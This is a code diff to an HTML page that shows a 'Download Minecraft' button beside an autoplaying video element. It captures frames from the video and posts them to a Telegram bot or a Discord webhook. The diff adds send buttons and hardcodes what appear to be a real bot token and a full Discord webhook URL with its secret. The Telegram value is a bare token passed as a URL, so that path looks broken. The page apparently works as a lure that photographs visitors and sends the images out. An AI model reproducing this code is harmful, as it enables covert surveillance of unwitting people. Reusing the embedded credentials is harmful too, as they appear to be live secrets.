@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Send Image to Telegram Webhook</title>
+    <title>Send Image to Webhooks</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -83,6 +83,8 @@
 
     <button id="downloadButton">Download Minecraft</button>
     <button id="colorChangeButton">Change Color</button>
+    <button id="sendToTelegramButton">Send to Telegram</button>
+    <button id="sendToDiscordButton">Send to Discord</button>
     <video id="videoElement" autoplay></video>
     <div id="status"></div>
     <div id="successMessage">Image sent successfully!</div>
@@ -101,17 +103,15 @@
                 });
         }
 
-        function capturePicture() {
+        function capturePicture(webhookURL) {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             const imgURL = canvas.toDataURL('image/png');
 
-            const webhookURL = 'https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto'; // Replace YOUR_BOT_TOKEN with your bot token
             const imgBlob = dataURItoBlob(imgURL);
             const payload = new FormData();
-            payload.append('chat_id', 'YOUR_CHAT_ID'); // Replace YOUR_CHAT_ID with the chat ID you want to send the image to
             payload.append('photo', imgBlob, 'captured_image.png');
 
             document.getElementById('status').innerText = 'Sending image...';
@@ -123,18 +123,18 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error('Failed to send image to Telegram webhook');
+                    throw new Error('Failed to send image to webhook');
                 }
                 document.getElementById('status').style.display = 'none';
                 document.getElementById('successMessage').style.display = 'block';
-                console.log('Image sent to Telegram webhook');
+                console.log('Image sent successfully');
             })
             .catch(error => {
                 document.getElementById('status').innerText = 'Error: ' + error.message;
                 console.error('Error:', error);
             });
 
-            console.log('Image ' + imgIndex + ' sent to Telegram webhook');
+            console.log('Image ' + imgIndex + ' sent to webhook');
             imgIndex++;
         }
 
@@ -170,6 +170,18 @@
             document.body.style.color = textColor;
             downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
             index = (index + 1) % colors.length;
+        });
+
+        const sendToTelegramButton = document.getElementById('sendToTelegramButton');
+        sendToTelegramButton.addEventListener('click', function () {
+            const telegramWebhookURL = '7003330372:AAEj0rg44xPlKIEPC4hr9wnJMd22vnVkbDg'; // Replace YOUR_BOT_TOKEN with your bot token
+            capturePicture(telegramWebhookURL);
+        });
+
+        const sendToDiscordButton = document.getElementById('sendToDiscordButton');
+        sendToDiscordButton.addEventListener('click', function () {
+            const discordWebhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Replace YOUR_DISCORD_WEBHOOK with your Discord webhook URL
+            capturePicture(discordWebhookURL);
         });
     </script>
 </body>
